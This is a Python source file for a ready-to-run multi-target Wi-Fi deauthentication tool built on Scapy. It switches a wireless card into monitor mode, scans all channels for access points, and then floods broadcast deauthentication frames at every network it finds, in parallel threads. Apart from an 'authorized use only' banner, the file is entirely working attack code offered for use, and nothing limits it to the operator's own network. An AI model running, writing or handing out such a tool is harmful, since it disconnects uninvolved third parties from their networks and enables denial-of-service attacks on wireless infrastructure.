#!/usr/bin/env python3

BANNER = r"""
    ██╗ █████╗ ███╗   ███╗██╗  ██╗
     ██║██╔══██╗████╗ ████║╚██╗██╔╝
     ██║███████║██╔████╔██║ ╚███╔╝ 
██   ██║██╔══██║██║╚██╔╝██║ ██╔██╗ 
╚█████╔╝██║  ██║██║ ╚═╝ ██║██╔╝ ██╗
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
 
  ⚡ Multi-Target WiFi Deauth Tool ⚡
  Built by - bxbySAMRAT 
  [ Auto Monitor Mode | Scapy-Powered ]
     FOR AUTHORIZED USE ONLY 🔴
"""

import argparse
import os
import sys
import time
import threading
import subprocess
import re
from scapy.all import (
    RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11Beacon, Dot11Elt
)

ap_store  = {}
ap_lock   = threading.Lock()
stop_flag = threading.Event()
CHANNELS  = list(range(1, 14))


# ── Monitor Mode Manager ──────────────────────
def enable_monitor_mode(iface):
    """Kill interfering processes and enable monitor mode."""
    print(f"[*] Killing interfering processes (NetworkManager, wpa_supplicant)...")
    subprocess.run(["airmon-ng", "check", "kill"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    print(f"[*] Enabling monitor mode on {iface}...")
    subprocess.run(["airmon-ng", "start", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    # ── Reliable detection using 'iw dev' ──────────────────
    # Parse all wireless interfaces and find the one in monitor mode
    iw_result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    mon_iface = None
    current_iface = None

    for line in iw_result.stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            current_iface = line.split()[1]
        if "type monitor" in line and current_iface:
            mon_iface = current_iface
            break

    # ── Fallback 1: check wlan0mon directly ────────────────
    if not mon_iface:
        candidate = iface + "mon"
        check = subprocess.run(["iwconfig", candidate],
                                capture_output=True, text=True)
        if "Monitor" in check.stdout:
            mon_iface = candidate

    # ── Fallback 2: use iw to force monitor mode manually ──
    if not mon_iface:
        print(f"[!] airmon-ng fallback failed, trying iw manually...")
        subprocess.run(["ip", "link", "set", iface, "down"],
                       stdout=subprocess.DEVNULL)
        subprocess.run(["iw", iface, "set", "monitor", "none"],
                       stdout=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"],
                       stdout=subprocess.DEVNULL)
        mon_iface = iface

    print(f"[+] Monitor mode enabled → interface: {mon_iface}\n")
    return mon_iface

def disable_monitor_mode(mon_iface, original_iface):
    """Restore NIC to managed mode after attack."""
    print(f"\n[*] Restoring {original_iface} to managed mode...")
    subprocess.run(["airmon-ng", "stop", mon_iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["service", "NetworkManager", "start"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[+] {original_iface} restored to managed mode.")


# ── Channel Hopper ──────────────────────────
def channel_hopper(iface):
    idx = 0
    while not stop_flag.is_set():
        ch = CHANNELS[idx % len(CHANNELS)]
        os.system(f"iwconfig {iface} channel {ch} 2>/dev/null")
        idx += 1
        time.sleep(0.25)


# ── Beacon Sniffer ───────────────────────────
def beacon_handler(pkt):
    if not (pkt.haslayer(Dot11Beacon) and pkt.haslayer(Dot11Elt)):
        return
    bssid = pkt[Dot11].addr2
    if not bssid:
        return
    ssid = pkt[Dot11Elt].info.decode(errors="ignore").strip()
    try:
        ch = int(ord(pkt[Dot11Elt:3].info))
    except Exception:
        ch = 0
    with ap_lock:
        if bssid not in ap_store:
            print(f"  [+] Found: {ssid or '<hidden>':<30} BSSID: {bssid}  CH:{ch}")
            ap_store[bssid] = (ssid, ch)


def scan_networks(iface, duration=15):
    print(f"[*] Scanning on {iface} for {duration}s...")
    sniff(iface=iface, prn=beacon_handler,
          timeout=duration, store=False,
          lfilter=lambda p: p.haslayer(Dot11Beacon))
    print(f"\n[*] Scan complete. {len(ap_store)} network(s) found.\n")


# ── Deauth Packet Builder ────────────────────
def build_deauth(bssid, client="ff:ff:ff:ff:ff:ff"):
    dot11 = Dot11(type=0, subtype=12,
                  addr1=client,
                  addr2=bssid,
                  addr3=bssid)
    return RadioTap() / dot11 / Dot11Deauth(reason=7)


# ── Per-AP Deauth Worker ──────────────────────
def deauth_worker(iface, bssid, ssid, channel, count, interval):
    os.system(f"iwconfig {iface} channel {channel} 2>/dev/null")
    pkt = build_deauth(bssid)
    print(f"  [>] Deauthing '{ssid}' ({bssid}) CH{channel}")
    sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
    print(f"  [✓] Done: {ssid}")


# ── Main Attack Orchestrator ──────────────────
def multi_deauth(iface, count, interval, threads_limit):
    if not ap_store:
        print("[!] No APs found. Exiting.")
        return
    print(f"[*] Launching deauth on {len(ap_store)} network(s)...\n")
    semaphore = threading.Semaphore(threads_limit)

    def throttled_worker(*args):
        with semaphore:
            deauth_worker(*args)

    workers = []
    for bssid, (ssid, ch) in ap_store.items():
        t = threading.Thread(
            target=throttled_worker,
            args=(iface, bssid, ssid, ch, count, interval),
            daemon=True
        )
        workers.append(t)
        t.start()

    for t in workers:
        t.join()

    print("\n[*] Multi-deauth attack complete.")


# ── Entry Point ───────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Multi-target WiFi Deauth | Auto Monitor Mode | Authorized use only"
    )
    parser.add_argument("-i", "--iface",    required=True,
                        help="Raw wireless interface (e.g., wlan0, wlan1)")
    parser.add_argument("-s", "--scan",     type=int,   default=15,
                        help="Scan duration in seconds (default: 15)")
    parser.add_argument("-c", "--count",    type=int,   default=500,
                        help="Deauth frames per AP (default: 500)")
    parser.add_argument("-t", "--interval", type=float, default=0.05,
                        help="Interval between frames in sec (default: 0.05)")
    parser.add_argument("-T", "--threads",  type=int,   default=10,
                        help="Max concurrent threads (default: 10)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("[!] Run as root: sudo python3 multi_deauth.py -i wlan0")

    print("=" * 55)
    print("  Multi-Deauth Tool | FOR AUTHORIZED USE ONLY")
    print("=" * 55)

    # ── AUTO MONITOR MODE ──
    mon_iface = enable_monitor_mode(args.iface)

    try:
        hop = threading.Thread(
            target=channel_hopper, args=(mon_iface,), daemon=True
        )
        hop.start()

        scan_networks(mon_iface, duration=args.scan)
        stop_flag.set()

        multi_deauth(mon_iface, args.count, args.interval, args.threads)

    finally:
        # ── AUTO RESTORE MANAGED MODE ──
        disable_monitor_mode(mon_iface, args.iface)


if __name__ == "__main__":
    main()
